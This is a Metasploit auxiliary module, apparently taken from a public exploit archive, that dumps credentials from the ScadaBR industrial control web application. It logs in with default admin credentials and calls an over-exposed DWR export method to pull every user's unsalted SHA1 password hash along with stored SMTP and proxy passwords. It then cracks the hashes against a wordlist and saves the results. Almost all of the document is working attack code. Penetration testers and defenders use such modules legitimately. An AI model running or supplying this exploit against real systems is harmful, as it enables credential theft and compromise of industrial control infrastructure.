# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ScadaBR Credentials Dumper&#039;,
      &#039;Description&#039;    => %q{
        This module retrieves credentials from ScadaBR, including
        service credentials and unsalted SHA1 password hashes for
        all users, by invoking the &#039;EmportDwr.createExportData&#039; DWR
        method of Mango M2M which is exposed to all authenticated
        users regardless of privilege level.
        This module has been tested successfully with ScadaBR
        versions 1.0 CE and 0.9 on Windows and Ubuntu systems.
      },
      &#039;Author&#039;         => &#039;Brendan Coles <bcoles[at]gmail.com>&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     => [&#039;URL&#039;, &#039;http://www.scadabr.com.br/?q=node/1375&#039;],
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, {} ]],
      &#039;DisclosureDate&#039; => &#039;May 28 2017&#039;))
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;USERNAME&#039;,  [ true, &#039;The username for the application&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;,  [ true, &#039;The password for the application&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The base path to ScadaBR&#039;, &#039;/ScadaBR&#039; ]),
        OptPath.new(&#039;PASS_FILE&#039;,   [ false, &#039;Wordlist file to crack password hashes&#039;,
          File.join(Msf::Config.data_directory, &#039;wordlists&#039;, &#039;unix_passwords.txt&#039;) ])
      ])
  end

  def login(user, pass)
    res = send_request_cgi &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;login.htm&#039;),
                           &#039;method&#039;    => &#039;POST&#039;,
                           &#039;cookie&#039;    => "JSESSIONID=#{Rex::Text.rand_text_hex(32)}",
                           &#039;vars_post&#039; => { &#039;username&#039; => Rex::Text.uri_encode(user, &#039;hex-normal&#039;),
                                            &#039;password&#039; => Rex::Text.uri_encode(pass, &#039;hex-normal&#039;) }

    unless res
      fail_with Failure::Unreachable, "#{peer} Connection failed"
    end

    if res.code == 302 && res.headers[&#039;location&#039;] !~ /login\.htm/ && res.get_cookies =~ /JSESSIONID=([^;]+);/
      @cookie = res.get_cookies.scan(/JSESSIONID=([^;]+);/).flatten.first
      print_good "#{peer} Authenticated successfully as &#039;#{user}&#039;"
    else
      fail_with Failure::NoAccess, "#{peer} Authentication failed"
    end
  end

  def export_data
    params = &#039;callCount=1&#039;,
             "page=#{target_uri.path}/emport.shtm",
             "httpSessionId=#{@cookie}",
             "scriptSessionId=#{Rex::Text.rand_text_hex(32)}",
             &#039;c0-scriptName=EmportDwr&#039;,
             &#039;c0-methodName=createExportData&#039;,
             &#039;c0-id=0&#039;,
             &#039;c0-param0=string:3&#039;,
             &#039;c0-param1=boolean:true&#039;,
             &#039;c0-param2=boolean:true&#039;,
             &#039;c0-param3=boolean:true&#039;,
             &#039;c0-param4=boolean:true&#039;,
             &#039;c0-param5=boolean:true&#039;,
             &#039;c0-param6=boolean:true&#039;,
             &#039;c0-param7=boolean:true&#039;,
             &#039;c0-param8=boolean:true&#039;,
             &#039;c0-param9=boolean:true&#039;,
             &#039;c0-param10=boolean:true&#039;,
             &#039;c0-param11=boolean:true&#039;,
             &#039;c0-param12=boolean:true&#039;,
             &#039;c0-param13=boolean:true&#039;,
             &#039;c0-param14=boolean:true&#039;,
             &#039;c0-param15=boolean:true&#039;,
             &#039;c0-param16=string:100&#039;,
             &#039;c0-param17=boolean:true&#039;,
             &#039;batchId=1&#039;

    uri = normalize_uri target_uri.path, &#039;dwr/call/plaincall/EmportDwr.createExportData.dwr&#039;
    res = send_request_cgi &#039;uri&#039;    => uri,
                           &#039;method&#039; => &#039;POST&#039;,
                           &#039;cookie&#039; => "JSESSIONID=#{@cookie}",
                           &#039;ctype&#039;  => &#039;text/plain&#039;,
                           &#039;data&#039;   => params.join("\n")

    unless res
      fail_with Failure::Unreachable, "#{peer} Connection failed"
    end

    unless res.body =~ /dwr.engine._remoteHandleCallback/
      fail_with Failure::UnexpectedReply, "#{peer} Export failed."
    end

    config_data = res.body.scan(/dwr.engine._remoteHandleCallback\(&#039;\d*&#039;,&#039;\d*&#039;,"(.+)"\);/).flatten.first
    print_good "#{peer} Export successful (#{config_data.length} bytes)"

    begin
      return JSON.parse(config_data.gsub(/\\r\\n/, &#039;&#039;).gsub(/\\"/, &#039;"&#039;))
    rescue
      fail_with(Failure::UnexpectedReply, "#{peer} Could not parse exported settings as JSON.")
    end
  end

  def load_wordlist(wordlist)
    return unless File.exist? wordlist
    File.open(wordlist, &#039;rb&#039;).each_line do |line|
      @wordlist << line.chomp
    end
  end

  def crack(user, hash)
    return user if hash.eql? Rex::Text.sha1 user
    pass = nil
    @wordlist.each do |word|
      if hash.eql? Rex::Text.sha1 word
        pass = word
        break
      end
    end
    pass
  end

  def run
    login datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]

    json = export_data

    service_data = { address:      rhost,
                     port:         rport,
                     service_name: (ssl ? &#039;https&#039; : &#039;http&#039;),
                     protocol:     &#039;tcp&#039;,
                     workspace_id: myworkspace_id }

    columns = &#039;Username&#039;, &#039;Password&#039;, &#039;Hash (SHA1)&#039;, &#039;Admin&#039;, &#039;E-mail&#039;
    user_cred_table = Rex::Text::Table.new &#039;Header&#039;  => &#039;ScadaBR User Credentials&#039;,
                                           &#039;Indent&#039;  => 1,
                                           &#039;Columns&#039; => columns

    if json[&#039;users&#039;].empty?
      print_error &#039;Found no user data&#039;
    else
      print_good "Found #{json[&#039;users&#039;].length} users"
      @wordlist = *&#039;0&#039;..&#039;9&#039;, *&#039;A&#039;..&#039;Z&#039;, *&#039;a&#039;..&#039;z&#039;
      @wordlist.concat([&#039;12345&#039;, &#039;admin&#039;, &#039;password&#039;, &#039;scada&#039;, &#039;scadabr&#039;])
      load_wordlist datastore[&#039;PASS_FILE&#039;] unless datastore[&#039;PASS_FILE&#039;].nil?
    end

    json[&#039;users&#039;].each do |user|
      next if user[&#039;username&#039;].eql?(&#039;&#039;)

      username = user[&#039;username&#039;]
      admin = user[&#039;admin&#039;]
      mail = user[&#039;email&#039;]
      hash = Rex::Text.decode_base64(user[&#039;password&#039;]).unpack(&#039;H*&#039;).flatten.first
      pass = crack username, hash
      user_cred_table << [username, pass, hash, admin, mail]

      if pass
        print_status "Found weak credentials (#{username}:#{pass})"
        creds = { origin_type:     :service,
                  module_fullname: fullname,
                  private_type:    :password,
                  private_data:    pass,
                  username:        user }
      else
        creds = { origin_type:     :service,
                  module_fullname: fullname,
                  private_type:    :nonreplayable_hash,
                  private_data:    hash,
                  username:        user }
      end

      creds.merge! service_data
      credential_core = create_credential creds
      login_data = { core: credential_core,
                     access_level: (admin ? &#039;Admin&#039; : &#039;User&#039;),
                     status: Metasploit::Model::Login::Status::UNTRIED }
      login_data.merge! service_data
      create_credential_login login_data
    end

    columns = &#039;Service&#039;, &#039;Host&#039;, &#039;Port&#039;, &#039;Username&#039;, &#039;Password&#039;
    service_cred_table = Rex::Text::Table.new &#039;Header&#039;  => &#039;ScadaBR Service Credentials&#039;,
                                              &#039;Indent&#039;  => 1,
                                              &#039;Columns&#039; => columns

    system_settings = json[&#039;systemSettings&#039;].first

    unless system_settings[&#039;emailSmtpHost&#039;].eql?(&#039;&#039;) || system_settings[&#039;emailSmtpUsername&#039;].eql?(&#039;&#039;)
      smtp_host = system_settings[&#039;emailSmtpHost&#039;]
      smtp_port = system_settings[&#039;emailSmtpPort&#039;]
      smtp_user = system_settings[&#039;emailSmtpUsername&#039;]
      smtp_pass = system_settings[&#039;emailSmtpPassword&#039;]
      vprint_good "Found SMTP credentials: #{smtp_user}:#{smtp_pass}@#{smtp_host}:#{smtp_port}"
      service_cred_table << [&#039;SMTP&#039;, smtp_host, smtp_port, smtp_user, smtp_pass]
    end

    unless system_settings[&#039;httpClientProxyServer&#039;].eql?(&#039;&#039;) || system_settings[&#039;httpClientProxyUsername&#039;].eql?(&#039;&#039;)
      proxy_host = system_settings[&#039;httpClientProxyServer&#039;]
      proxy_port = system_settings[&#039;httpClientProxyPort&#039;]
      proxy_user = system_settings[&#039;httpClientProxyUsername&#039;]
      proxy_pass = system_settings[&#039;httpClientProxyPassword&#039;]
      vprint_good "Found HTTP proxy credentials: #{proxy_user}:#{proxy_pass}@#{proxy_host}:#{proxy_port}"
      service_cred_table << [&#039;HTTP proxy&#039;, proxy_host, proxy_port, proxy_user, proxy_pass]
    end

    print_line
    print_line user_cred_table.to_s
    print_line
    print_line service_cred_table.to_s

    path = store_loot &#039;scadabr.config&#039;, &#039;text/plain&#039;, rhost, json, &#039;ScadaBR configuration settings&#039;
    print_good "Config saved in: #{path}"
  end
end

